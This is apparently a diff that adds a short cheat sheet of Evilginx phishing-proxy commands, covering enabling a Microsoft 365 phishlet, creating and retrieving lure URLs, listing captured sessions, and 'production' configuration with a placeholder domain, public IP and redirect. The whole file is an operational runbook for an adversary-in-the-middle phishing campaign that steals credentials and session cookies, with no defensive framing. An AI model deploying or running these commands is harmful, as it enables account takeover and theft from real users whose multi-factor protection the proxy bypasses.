@@ -1,0 +1,17 @@
+# Attach to evilginx
+tmux attach -t evilginx
+
+# Essential commands
+phishlets
+phishlets enable m364
+lures
+lures get-url 0
+sessions
+sessions 1
+
+# Production
+config domain yourdomain.com
+config ipv4 external YOUR_PUBLIC_IP
+phishlets hostname m364 yourdomain.com
+lures create m364
+lures edit 0 redirect_url https://www.yourdomain.com
